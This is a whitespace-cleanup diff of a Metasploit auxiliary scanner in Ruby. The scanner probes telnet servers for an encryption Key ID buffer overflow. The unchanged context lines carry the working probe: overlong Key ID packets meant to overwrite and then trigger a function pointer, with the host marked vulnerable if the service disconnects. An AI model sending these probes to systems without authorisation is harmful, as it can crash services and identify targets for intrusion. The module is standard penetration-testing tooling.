@@ -47,14 +47,14 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			::Timeout.timeout(to) do
 				res = connect
-				
+
 				# This makes db_services look a lot nicer.
 				banner_sanitized = Rex::Text.to_hex_ascii(banner.to_s)
 				report_service(:host => rhost, :port => rport, :name => "telnet", :info => banner_sanitized)
-				
+
 				# Check for encryption option ( IS(0) DES_CFB64(1) )
 				sock.put("\xff\xfa\x26\x00\x01\x01\x12\x13\x14\x15\x16\x17\x18\x19\xff\xf0")
-				
+
 				loop do
 					data = sock.get_once(-1, to) rescue nil
 					if not data
@@ -66,9 +66,9 @@ class Metasploit3 < Msf::Auxiliary
 
 				buff_good = "\xff\xfa\x26" + "\x07" + "\x00" + ("X" * 63) + "\xff\xf0"
 				buff_long = "\xff\xfa\x26" + "\x07" + "\x00" + ("X" * 64) + ( "\xcc" * 32) + "\xff\xf0"
-				
+
 				begin
-				
+
 					#
 					# Send a long, but within boundary Key ID
 					#
@@ -78,12 +78,12 @@ class Metasploit3 < Msf::Auxiliary
 						print_status("#{ip}:#{rport} UNKNOWN: No response to the initial probe: #{banner_sanitized}")
 						return
 					end
-					
+
 					unless data.index("\xff\xfa\x26\x08\xff\xf0")
 						print_status("#{ip}:#{rport} UNKNOWN: Invalid reply to Key ID: #{data.unpack("H*")[0]} - #{banner_sanitized}")
 						return
 					end
-					
+
 					#
 					# First round to overwrite the function pointer itself
 					#
@@ -97,7 +97,7 @@ class Metasploit3 < Msf::Auxiliary
 					unless data.index("\xff\xfa\x26\x08\xff\xf0")
 						print_status("#{ip}:#{rport} UNKNOWN: Invalid reply to first Key ID: #{data.unpack("H*")[0]} - #{banner_sanitized}")
 						return
-					end			
+					end
 
 					#
 					# Second round to force the function to be called
@@ -112,14 +112,14 @@ class Metasploit3 < Msf::Auxiliary
 					unless data.index("\xff\xfa\x26\x08\xff\xf0")
 						print_status("#{ip}:#{rport} UNKNOWN: Invalid reply to second Key ID: #{data.unpack("H*")[0]} - #{banner_sanitized}")
 						return
-					end		
-					
+					end
+
 					print_status("#{ip}:#{rport} NOT VULNERABLE: Service did not disconnect: #{banner_sanitized}")
 					return
-					
-				rescue ::EOFError	
-				end						
-				
+
+				rescue ::EOFError
+				end
+
 				# EOFError or response to 64-byte Key Id indicates vulnerable systems
 				print_good("#{ip}:#{rport} VULNERABLE: #{banner_sanitized}")
 				report_vuln(
@@ -132,7 +132,7 @@ class Metasploit3 < Msf::Auxiliary
 							:refs   => self.references
 					}
 				)
-				
+
 			end
 		rescue ::Rex::ConnectionError
 		rescue Timeout::Error
@@ -144,4 +144,3 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 end
-
